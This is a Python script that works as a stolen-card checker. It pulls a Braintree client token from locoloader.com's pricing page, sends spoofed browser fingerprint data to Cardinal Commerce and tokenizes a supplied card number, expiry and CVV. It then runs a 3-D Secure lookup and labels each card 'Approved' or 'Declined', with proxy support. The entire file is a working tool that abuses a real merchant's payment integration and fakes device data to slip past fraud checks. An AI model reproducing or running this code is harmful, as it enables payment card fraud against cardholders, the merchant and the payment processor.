import requests, uuid, base64, json


def parseX(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]

    except ValueError:
        return "None"

def get_bin(cc):
    try:
        bin = cc[:6]
        return bin
    except:
        return "None"

def b3vbv(cc, mes, ano, cvv, proxyg):
        
        session = requests.Session()
        if proxyg:
            if isinstance(proxyg, dict):
                session.proxies.update({k.replace('://', ''): v for k, v in proxyg.items()})
            else:
                session.proxies = {
                    "http": proxyg,
                    "https": proxyg
                }

            #----------------------requiere1----------------------------#

        headers = {
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
            'accept-language': 'es-ES,es;q=0.7',
            'cache-control': 'max-age=0',
            'priority': 'u=0, i',
            'sec-ch-ua': '"Brave";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'sec-gpc': '1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',
            # 'cookie': 'US=uattf1j5qlo2i3prffgfi2lsr7',
        }

        response = session.get('https://www.locoloader.com/pricing/', headers=headers).text


        clienttoken = parseX(response, "authorization: '", "'")
        bearer = json.loads(base64.b64decode(clienttoken))
        bearer = bearer['authorizationFingerprint']

        #-----------------------id reference -------------------------#
        headers = {
            'accept': '*/*',
            'accept-language': 'es-ES,es;q=0.7',
            'authorization': f'Bearer {bearer}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://www.locoloader.com',
            'priority': 'u=1, i',
            'sec-ch-ua': '"Brave";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': str(uuid.uuid4()),
            },
            'query': 'query ClientConfiguration {   clientConfiguration {     analyticsUrl     environment     merchantId     assetsUrl     clientApiUrl     creditCard {       supportedCardBrands       challenges       threeDSecureEnabled       threeDSecure {         cardinalAuthenticationJWT         cardinalSongbirdUrl         cardinalSongbirdIdentityHash       }     }     applePayWeb {       countryCode       currencyCode       merchantIdentifier       supportedCardBrands     }     fastlane {       enabled       tokensOnDemand {         enabled         tokenExchange {           enabled         }       }     }     googlePay {       displayName       supportedCardBrands       environment       googleAuthorization       paypalClientId     }     ideal {       routeId       assetsUrl     }     masterpass {       merchantCheckoutId       supportedCardBrands     }     openBanking {       businessNames       allowListedDomains       profileId     }     paypal {       displayName       clientId       assetsUrl       environment       environmentNoNetwork       unvettedMerchant       braintreeClientId       billingAgreementsEnabled       merchantAccountId       currencyCode       payeeEmail     }     unionPay {       merchantAccountId     }     usBankAccount {       routeId       plaidPublicKey     }     venmo {       merchantId       accessToken       environment       enrichedCustomerDataEnabled    }     visaCheckout {       apiKey       externalClientId       supportedCardBrands     }     braintreeApi {       accessToken       url     }     supportedFeatures   } }',
            'operationName': 'ClientConfiguration',
        }

        response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data).json()

        merchantid = response['data']['clientConfiguration']['merchantId']
        jwt = response['data']['clientConfiguration']['creditCard']['threeDSecure']['cardinalAuthenticationJWT']


      #---------------- fin id referen -----------------#
        headers = {
            'accept': '*/*',
            'accept-language': 'es-ES,es;q=0.7',
            'content-type': 'application/json;charset=UTF-8',
            'origin': 'https://www.locoloader.com',
            'priority': 'u=1, i',
            'sec-ch-ua': '"Brave";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',
            'x-cardinal-tid': 'Tid-fe04035a-3e43-4257-bfc3-caccfcc89fdf',
        }

        json_data = {
            'BrowserPayload': {
                'Order': {
                    'OrderDetails': {},
                    'Consumer': {
                        'BillingAddress': {},
                        'ShippingAddress': {},
                        'Account': {},
                    },
                    'Cart': [],
                    'Token': {},
                    'Authorization': {},
                    'Options': {},
                    'CCAExtension': {},
                },
                'SupportsAlternativePayments': {
                    'cca': True,
                    'hostedFields': False,
                    'applepay': False,
                    'discoverwallet': False,
                    'wallet': False,
                    'paypal': False,
                    'visacheckout': False,
                },
            },
            'Client': {
                'Agent': 'SongbirdJS',
                'Version': '1.35.0',
            },
            'ConsumerSessionId': 'None',
            'ServerJWT': jwt,
        }

        response = session.post('https://centinelapi.cardinalcommerce.com/V1/Order/JWT/Init', headers=headers, json=json_data).json()

        CardinalJWT = response['CardinalJWT']
        
        partes = CardinalJWT.split('.')
        payload_codificado = partes[1]
        
        payload_decodificado = base64.urlsafe_b64decode(payload_codificado + '=' * (4 - len(payload_codificado) % 4))
        decode1 = json.loads(payload_decodificado)
        ReferenceId = decode1['ReferenceId']


        #------------------------- save brounser-----------------------------#

        headers = {
            'accept': '*/*',
            'accept-language': 'es-ES,es;q=0.7',
            'content-type': 'application/json',
            'origin': 'https://geo.cardinalcommerce.com',
            'priority': 'u=1, i',
            'referer': f'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/Render?threatmetrix=true&alias=Default&orgUnitId=5c8824e5adb1562e003377a3&tmEventType=PAYMENT&referenceId={ReferenceId}&geolocation=false&origin=Songbird',
            'sec-ch-ua': '"Brave";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-storage-access': 'none',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest',
            # 'cookie': '_cfuvid=RjeB.uNYy5uBtcCrc6yqeVHlFQ9EEIPhkN8vfwjXbAc-1776106546519-0.0.1.1-604800000',
        }

        json_data = {
            'Cookies': {
                'Legacy': True,
                'LocalStorage': True,
                'SessionStorage': True,
            },
            'DeviceChannel': 'Browser',
            'Extended': {
                'Browser': {
                    'Adblock': True,
                    'AvailableJsFonts': [],
                    'DoNotTrack': 'unknown',
                    'JavaEnabled': False,
                },
                'Device': {
                    'ColorDepth': 32,
                    'Cpu': 'unknown',
                    'Platform': 'Win32',
                    'TouchSupport': {
                        'MaxTouchPoints': 0,
                        'OnTouchStartAvailable': False,
                        'TouchEventCreationSuccessful': False,
                    },
                },
            },
            'Fingerprint': 'b38df95685cf5f3f5bee547ed50034e0',
            'FingerprintingTime': 1288,
            'FingerprintDetails': {
                'Version': '1.5.1',
            },
            'Language': 'es-ES',
            'Latitude': None,
            'Longitude': None,
            'OrgUnitId': '5c8824e5adb1562e003377a3',
            'Origin': 'Songbird',
            'Plugins': [
                'WebKit built-in PDF::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
                'PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
                'Chromium PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
                'Microsoft Edge PDF Viewer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
                'hYrdWTw::ZUpzZrVpzZzCJECgQIEKNOHDBfPPuXL::~HLk,~HLk',
                '3IjZMOPu::3AAIjRnTRIMl5k5kxBIjZUpzhYz4cOm6::~USJ,~USJ',
                'JavaScript PDF and PS Renderer::Portable Document Format::application/pdf~pdf,text/pdf~pdf',
            ],
            'ReferenceId': ReferenceId,
            'Referrer': '',
            'Screen': {
                'FakedResolution': False,
                'Ratio': 1.6,
                'Resolution': '1440x900',
                'UsableResolution': '1440x900',
                'CCAScreenSize': '02',
            },
            'CallSignEnabled': None,
            'ThreatMetrixEnabled': False,
            'ThreatMetrixEventType': 'PAYMENT',
            'ThreatMetrixAlias': 'Default',
            'TimeOffset': -120,
            'UserAgent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',
            'UserAgentDetails': {
                'FakedOS': False,
                'FakedBrowser': False,
            },
            'VcdiClientRequestId': None,
            'BinSessionId': 'da307637-f36d-459c-967f-9a604853eb73',
        }

        response = session.post(
            'https://geo.cardinalcommerce.com/DeviceFingerprintWeb/V2/Browser/SaveBrowserData',
            headers=headers,
            json=json_data,
        )


        #--------------------------require2----------------------------------#

        headers = {
            'accept': '*/*',
            'accept-language': 'es-ES,es;q=0.7',
            'authorization': f'Bearer {bearer}',
            'braintree-version': '2018-05-10',
            'content-type': 'application/json',
            'origin': 'https://assets.braintreegateway.com',
            'priority': 'u=1, i',
            'referer': 'https://assets.braintreegateway.com/',
            'sec-ch-ua': '"Brave";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',
        }

        json_data = {
            'clientSdkMetadata': {
                'source': 'client',
                'integration': 'custom',
                'sessionId': str(uuid.uuid4()),
            },
            'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId         business         consumer         purchase         corporate       }     }   } }',
            'variables': {
                'input': {
                    'creditCard': {
                        'number': cc,
                        'expirationMonth': mes,
                        'expirationYear': ano,
                        'cvv': cvv,
                        'cardholderName': 'John Smith',
                    },
                    'options': {
                        'validate': False,
                    },
                },
            },
            'operationName': 'TokenizeCreditCard',
        }

        response = session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data).json()

        tokencc = response['data']['tokenizeCreditCard']['token']

            #----------------------resquiere3------------------#
        headers = {
            'accept': '*/*',
            'accept-language': 'es-ES,es;q=0.7',
            'content-type': 'application/json',
            'origin': 'https://www.locoloader.com',
            'priority': 'u=1, i',
            'sec-ch-ua': '"Brave";v="147", "Not.A/Brand";v="8", "Chromium";v="147"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'cross-site',
            'sec-gpc': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/147.0.0.0 Safari/537.36',
        }

        json_data = {
            'amount': '84',
            'browserColorDepth': 32,
            'browserJavaEnabled': False,
            'browserJavascriptEnabled': True,
            'browserLanguage': 'es-ES',
            'browserScreenHeight': 800,
            'browserScreenWidth': 1280,
            'browserTimeZone': -120,
            'deviceChannel': 'Browser',
            'additionalInfo': {
                'email': 'example@gmail.com',
            },
            'bin': get_bin(cc),
            'dfReferenceId': ReferenceId,
            'clientMetadata': {
                'requestedThreeDSecureVersion': '2',
                'sdkVersion': 'web/3.134.0',
                'cardinalDeviceDataCollectionTimeElapsed': 1192,
                'issuerDeviceDataCollectionTimeElapsed': 9006,
                'issuerDeviceDataCollectionResult': True,
            },
            'authorizationFingerprint': bearer,
            'braintreeLibraryVersion': 'braintree/web/3.134.0',
            '_meta': {
                'merchantAppId': 'www.locoloader.com',
                'platform': 'web',
                'sdkVersion': '3.134.0',
                'source': 'client',
                'integration': 'custom',
                'integrationType': 'custom',
                'sessionId': str(uuid.uuid4()),
            },
        }

        response = session.post(
            f'https://api.braintreegateway.com/merchants/3bbxc2hs5sgbs95q/client_api/v1/payment_methods/{tokencc}/three_d_secure/lookup',
            headers=headers,
            json=json_data,
        ).json()

        code = response['paymentMethod']['threeDSecureInfo']['status']
                        
        if "authenticate_successful" in code:
            msg = "Approved! ✅"
            respuesta = code
            
        elif "authenticate_attempt_successful" in code:
            msg = "Approved! ✅"
            respuesta = code
            
        else:
            msg = "Declined! ❌"
            respuesta = code
            
        session.close()
        
        return msg, respuesta